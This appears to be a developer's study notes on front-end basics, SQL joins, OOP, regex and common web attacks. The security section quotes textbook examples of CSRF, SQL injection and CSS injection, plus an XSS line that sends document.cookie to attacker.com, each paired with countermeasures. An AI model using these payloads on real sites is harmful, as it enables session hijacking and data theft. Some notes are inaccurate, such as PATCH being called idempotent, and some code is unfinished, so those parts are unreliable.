## Frontend

### HTML5

#### ID Attribute

##### Description
**The ID attribute provides a document-wide unique identifier for an element.** This is used to identify the element so that stylesheets can alter its presentational properties, and scripts may alter, animate or delete its contents or presentation. Appended to the URL of the page, it provides a globally unique identifier for the element, typically a sub-section of the page.

##### Example
`<div id="content"></div>`

#### Class Attribute

##### Description
**The class attribute provides a way of classifying similar elements.** This can be used for semantic or presentation purposes. Multiple class values may be specified.

##### Example
`<div class="notation"></div>`

#### Semantic HTML

##### Description

---

### CSS3
- ID vs. class
- Flexbox
- Define sematic CSS
- Media Queries
- (r)em vs. px vs. %

---

### JavaScript
JavaScript is a prototype-based language in which classes are not present, and behavior reuse (known as inheritance in class-based languages) is accomplished through a process of decorating existing objects which serve as prototypes.

#### Function Expression vs. Declaration
`var foo = function(){}` is a function expression defined at run-time. `function bar(){}` is a function declaration defined at parse-time.

#### call() vs. apply()
`Func.call(this, arg1, arg2, ...)`
`Func.apply(this, [arg1, arg2, ...])`

#### Undefined vs. null
For example, when declaring `var foo;`, the variable `foo` will be `undefined` because it is not yet initialized. `null`, however, is an object. Examples:

```
var foo (= undefined);
foo == null;        // true
foo === null;       // false
foo == undefined;   // true
foo === undefined;  // true
typeof foo;         // undefined

var foo = null;
foo == null;        // true
foo === null;       // true
foo == undefined;   // true
foo === undefined;  // false
typeof foo;         // object
```

#### Assignment & Comparison Operators
- A single equal (`=`) is an assignment operator. It assigns a value to a variables. For example, `var foo = "foo";`.
- Double equals (`==`) is a "weak" comparison operator that performs type coercion.
- Triple equals (`===`) is a strict comparison operator that will check for type and value.

| Condition                | `==`    | `===`
|--------------------------|---------|------
| `"1" -> 1`               | `true`  | `false`
| `"" -> 0`                | `true`  | `false`
| `"" -> false`            | `true`  | `false`
| `"" -> null`             | `false` | `false`
| `"" -> undefined`        | `false` | `false`
| `"true" -> true`         | `false` | `false`
| `null -> null`           | `true`  | `true`
| `undefined -> undefined` | `true`  | `true`
| `null -> undefined`      | `true`  | `false`
| `false -> undefined`     | `false` | `false`
| `false -> null`          | `false` | `false`

#### Types
| Expression            | Value
|-----------------------|------
| `typeof true`         | `"boolean"`
| `typeof 1`            | `"number"`
| `typeof NaN`          | `"number"`
| `typeof Infinity`     | `"number"`
| `typeof "true"`       | `"string"`
| `typeof function(){}` | `"function"`
| `typeof undefined`    | `"undefined"`
| `typeof {}`           | `"object"`
| `typeof []`           | `"object"`
| `typeof null`         | `"object"`
| `typeof new Date()`   | `"object"`

#### Self-executing Functions
```
(function(){
  //...
})();
```

#### Closures
Closures are functions that refer to independent (free) variables. In other words, the function defined in the closure 'remembers' the environment in which it was created. A closure is a special kind of object that combines two things: a function, and the environment in which that function was created. The environment consists of any local variables that were in-scope at the time that the closure was created.

##### Example
```
var makeCounter = function () {
  var _counter = 0;

  return {
    increment: function (amount) {
      _counter = _counter + amount;
      return _counter;
    },
    decrement: function (amount) {
      _counter = _counter - amount;
      return _counter;
    },
    getCounter: function () {
      return _counter;
    }
  }
}
```

- [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures)

#### OOP
Redefining the prototype via `MyObject.prototype = {};` is not recommended so, instead, append to the existing prototype via `MyObject.prototype.foo = function(){};`.

```
// Class defintion and constructor
var Person = function(firstName, lastName){

  // Private class variable
  var age = 29;

  // Public instance variable
  this.firstName = firstName;
  this.lastName = lastName;

  // Private class method
  var getAge

  // Public instance method
  this.fullName = function(){
    return this.firstName + " " + this.lastName
  }

}

var person1 = new Person();
```

##### Namespaces
Create a **single** global variable (usually an object `{}`) that houses all other application code. For example, `var MyApp = MyApp || {};`. From here, sub-namespaces can be created via `MyApp.store = {};`.

#### Node

#### Dependency Injection
- RequireJS (AMD vs. CJS)

#### Grunt vs. Gulp
Grunt is "configuration over code" whereas Gulp is "code over configuration". Gulp is stream-based. The Gulp API consists of `task`, `watch`, `src`, `pipe`, and `dest`.

- Directives
- Factories
- Karma

### SQL

#### JOINs

##### Description
An **inner join** of A and B gives the result of A intersect B.
An **outer join** of A and B gives the results of A union B.

##### Examples
See [http://sqlfiddle.com/#!2/0d1c7/12](http://sqlfiddle.com/#!2/0d1c7/12)

Given this schema:

| TableA | TableB
|--------|-------
| 1      | 3
| 2      | 4
| 3      | 5
| 4      | 6

> Note that (1,2) are unique to TableA, (3,4) are common to both TableA and TableB, and (5,6) are unique to TableB

###### Inner Join
Gives the intersection of two tables.

`SELECT * FROM TableA INNER JOIN TableB ON TableA.a = TableB.b`

| a | b
|---|---
| 3 | 3
| 4 | 4

###### Left Outer Join
Gives all the rows of the "left" table, plus any common rows from the other table.

`SELECT * FROM TableA LEFT OUTER JOIN TableB ON TableA.a = TableB.b`

| a | b
|---|---
| 1 | null
| 2 | null
| 3 | 3
| 4 | 4


###### Full Outer Join
Gives the union of two tables (all the rows from both tables)

`SELECT * FROM TableA FULL OUTER JOIN TableB ON TableA.a = TableB.b`

| a    | b
|------|---
| 1    | null
| 2    | null
| 3    | 3
| 4    | 4
| null | 5
| null | 6

| `PUT`    | Used to update a **complete** resource (idempotent)
| `PATCH`  | Used to update a **partial** resource (idempotent)
| `DELETE` | Used to delete a resource (idempotent)

#### Status Codes

| Status Code | Description
|-------------|------------
| 2xx         | Success
| 3xx         | Redirection

### OOP

#### Core Principles
- **Abstraction** is used to manage complexity by decomposing complex systems into smaller components. It is the essential characteristics of an object that distinguish it from all other kinds of objects.
- **Encapsulation** is the hiding of data implementation by restricting access to accessors (get) and mutators (set).
- **Inheritance** describes the relationships between objects.
- **Polymorphism** means being able to send the same message to different objects and get different results (one name, many forms).

#### Single Table Inheritance (STI)
STI is the idea of using a single table to reflect multiple models that inherit from a base model.

## Misc

### Unix Epoch
An instant in time chosen as the origin of a particular era. The "epoch" then serves as a reference point from which time is measured. Time measurement units are counted from the epoch so that the date and time of events can be specified unambiguously.

January 1, 1970

### Duck Typing
Duck typing is only concerned with ensuring that objects behave as demanded of them in a given context, rather than ensuring that they are of a specific type. Instead of specifying types formally, duck typing practices rely on documentation, clear code, and testing to ensure correct use

---

### Regex

| Expression | Description
|------------|------------
| `[abc]`    | A single character of: a, b, or c
| `[^abc]`   | Any single character except: a, b, or c
| `[a-z]`    | Any single character in the range a-z
| `[a-zA-Z]` | Any single character in the range a-z or A-Z
| `^`        | Start of line
| `$`        | End of line
| `\A`       | Start of string
| `\z`       | End of string
| `.`        | Any single character
| `\s`       | Any whitespace character
| `\S`       | Any non-whitespace character
| `\d`       | Any digit
| `\D`       | Any non-digit
| `\w`       | Any word character (letter, number, underscore)
| `\W`       | Any non-word character
| `\b`       | Any word boundary
| `(...)`    | Capture everything enclosed
| `(a|b)`    | a or b
| `a?`       | Zero or one of a
| `a*`       | Zero or more of a
| `a+`       | One or more of a
| `a{3}`     | Exactly 3 of a
| `a{3,}`    | 3 or more of a
| `a{3,6}`   | Between 3 and 6 of a

### Security

#### Cross-site Request Forgery (CSRF / XSRF)

##### Description
XSRF attacks works by including a link or script in a page that accesses a site to which the user is known (or is supposed) to have been authenticated. For example, one user, Alice, might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Alice's bank's website (rather than an image file). If Alice's bank keeps her authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Alice's browser to load the image will submit the withdrawal form with her cookie, thus authorizing a transaction without Alice's approval.

##### Example
`<img src="http://bank.example.com/withdraw?account=Alice&amount=1000000&for=Mallory">`

##### Countermeasures
- Use GET and POST requests appropriately
- Embed additional authentication data -- such as a synchronizer token -- into requests that allows the web application to detect requests from unauthorized locations

##### Resources
- [http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf](http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)

#### Cross-site Scripting (XSS)

##### Description
**The most common entry points are just about everywhere where the user can input data or any URL parameter. An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim.** XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.

##### Example
`<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>`

##### Countermeasures
**Escaping user input is essential.** It is very important to filter malicious input, but it is also important to escape the output of the web application. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete

##### Resources
- [http://guides.rubyonrails.org/security.html#cross-site-scripting-xss](http://guides.rubyonrails.org/security.html#cross-site-scripting-xss)

#### CSS Injection

##### Description
**CSS injection is actually JavaScript injection**, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.

##### Example
`<div style="background:url('javascript:alert(1)')">`

##### Resources
- [http://guides.rubyonrails.org/security.html#css-injection](http://guides.rubyonrails.org/security.html#css-injection)

#### SQL Injection

##### Description
SQL injection attacks aim at **influencing database queries by manipulating web application parameters**.

##### Example
```
# Given the following user input...
# ' OR 1 --

# An incorrectly written query such as...
Project.where("name = '#{params[:name]}'")

# Will result in a malicious SQL query like this...
SELECT * FROM projects WHERE name = '' OR 1 --'
```

##### Countermeasures
- Escape special SQL characters
- Rather than strings, pass an array such as `User.where("login = ? AND password = ?", user_name, password).first`

#### Denial of Service (DoS)

##### Description
An attempt to make a machine or network resource unavailable to its intended users.
